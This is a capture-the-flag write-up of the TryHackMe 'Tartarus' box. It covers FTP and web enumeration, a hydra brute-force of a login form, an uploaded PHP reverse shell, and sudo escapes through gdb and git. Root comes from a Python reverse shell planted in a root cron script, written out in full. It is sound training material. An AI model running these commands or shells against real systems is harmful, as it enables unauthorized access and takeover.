# 'Tartarus' box writeup
## Tartarus is a CTF box created by csenox and available on the [TryHackMe platform](https://tryhackme.com).
## Read about [GDB Privesc](https://gtfobins.github.io/gtfobins/gdb/), [GIT Privesc](https://gtfobins.github.io/gtfobins/git/) and [Upgrade Shell to interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
# ![bg](images/background.jpeg?raw=true "Title")

## Foothold
+ **We deploy the machine and start with a nmap scan for open ports**

``nmap -sV -sC -oN scan1 10.10.3.149``

# ![2](images/scantart.jpg?raw=true "scan")

**We can see 3 open ports, with ftp, ssh and http services on. Looking into the ftp server status, we can see that the anonymous default login is enabled. Let's log in into using with the ``anonymous`` user and see what we got**

``ftp 10.10.3.149``

# ![3](images/ftplog.jpg?raw=true "ftp")

+ **We have a ``test.txt`` file inside ftp, which seems to be just a test file, testing the vsftpd 3.0 service. But we also have a strange hidden directory, named `...`. Kinda tricky, but let's go into it and see what's inside it**

+ **Navigating twice inside the `...`, we finally get a file named ``yougotgoodeyes.txt``. Let's take it and see what's inside**

``get yougotgoodeyes.txt``

# ![4](images/jpg?raw=true "cd ...")

+ **Reading the given files, it seems like we got some hidden directory inside our http server. Let's navigate to it**

# ![5](images/loginpage.png?raw=true "...")

+ **It's a login page but we need some credentials inside. I've firstly tried SQL injection and looking into source code, but nothing found, so let's continue the enumeration: let's do a gobuster scan for another directories.**

# ![6](images/dirtart.jpg?raw=true "...")

**We can see a robots.txt directory inside. Going to the web-page directory, we can see a message and a disallowed entry: the /admin-dir page**

# ![7](images/robotsos.jpg?raw=true "...")

+ **Looking inside the ``admin-dir`` directory page we can see two shared files: userid and credentials.txt. Let's get them inside our machine**

``wget http://10.10.3.149/admin-dir/userid; wget http://10.10.3.149/admin-dir/credentials.txt``

+ **The files looks like some login credentails so let's use them to bruteforce our login page found. I'm gonna use hydra for this, but first i'm gonna see the login request form needed for our bruteforce tool. I use burpsuite for this kind of job**

# ![8](images/burprealreq.jpg?raw=true "req")

**It seems we have a post form, and the 'Incorrect username' as failure condition we're gonna use for the hydra. But surely there's another failure condition, maybe an 'Incorrect password' one, which we need too, because hydra will only parse the user's list and will take all passwords as good. So, we're gonna use the help of a regex to create the failure condition, which will be ``Incorrect*``**

``hydra 10.10.3.149 -L userid -P credentials.txt http-post-form "/sUp3r-s3cr3t/authenticate.php/:username=^USER^&password=^PASS^&Login=Login:F=Incorrect*"``

# ![9](images/hydrated.jpg?raw=true "hydr")

# 1st User escalation

+ **Using the credentials to login on our page, we can see we have an upload section. We can go into uploading a reverse shell, but we need to find the upload directory so we can access our uploaded file. For this, let's make another gobuster scan of our secret directory**

# ![111](images/uplodo.jpg?raw=true "secsc")

``gobuster dir -u http://10.10.3.149/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirb/big.txt``

# ![10](images/secscan.jpg?raw=true "secsc")

**We found another directory inside and finally got a /images/upload dir, where we can find our reverse shell after we're gonna upload it. Let's upload the pentest-monkey [php-reverse shell](https://github.com/pentestmonkey/php-reverse-shell). Don't forget to change the $ip parameter with your tunneled ip address and start a nc listener**

``nc -lvnp 1234``

# ![11](images/gotrev.jpg?raw=true "secsc")

+ **And we are in! Let's get our interactive shell and read our first user flag, inside the ``/home/d4rckh`` directory**

``python -c 'import pty;pty.spawn("bin/bash")'``

# ![12](images/userflg.jpg?raw=true "secsc")

# 2nd User escalation

+ **Let's run a `sudo -l` command on the ``www-data`` user. We can see that the user thirtytwo can run the gdb executable from ``/var/www/gdb``. Let's see if we can escalate with gdb, getting a shell**

# ![13](images/sudol1.jpg?raw=true "secsc")

``sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit``

**And we are thirtytwo! Let's continue to escalate to the 2nd user**

# ![14](images/imthirt.jpg?raw=true "secsc")

# 3rd User escalation

+ **Running again a ``sudo -l`` we can see that we can run the ``/usr/bin/git`` with d4rckh privileges. Let's exploit this and get a new user shell, but first make sure you have an interactive shell inside our thirtytwo user**

# ![15](images/sudol2.jpg?raw=true "secsc")

``sudo -u d4rckh /usr/bin/git help config``

``!/bin/sh``

# ![16](images/imd4.jpg?raw=true "secsc")

# Root escalation

+ **Let's continue looking into the ``/etc/crontab`` file**

# ![17](images/cronos.jpg?raw=true "secsc")

**We can see that a script from d4rck user home directory is running every two minutes. Maybe we can overwrite it so we can run a shell, because the script is runned by root user**

# ![18](images/permiso.jpg?raw=true "secsc")

+ **We have the writing permission, so let's overwrite it's content and get a root shell. First, we must upgrade our shell because the vim will be broken and we'll have some troubles. I used the stty options from [ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)**

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

**Let's rewrite our python script: we're gonna get a reverse shell and it will be runned as root, as we've seen before**

```python
# -*- coding: utf-8 -*-
#!/usr/bin/env python
import socket, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.0", 6969))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.system("/bin/sh -i")
```

# ![19](images/pyhscr(1).jpg?raw=true "secsc")

+ **And we are root! It was a funny box, we made some important and classical privilege escalation actions and thousands of thanks should go to csenox, the creator of this box!**

# ![20](images/rootflagas.jpg?raw=true "secsc")










`





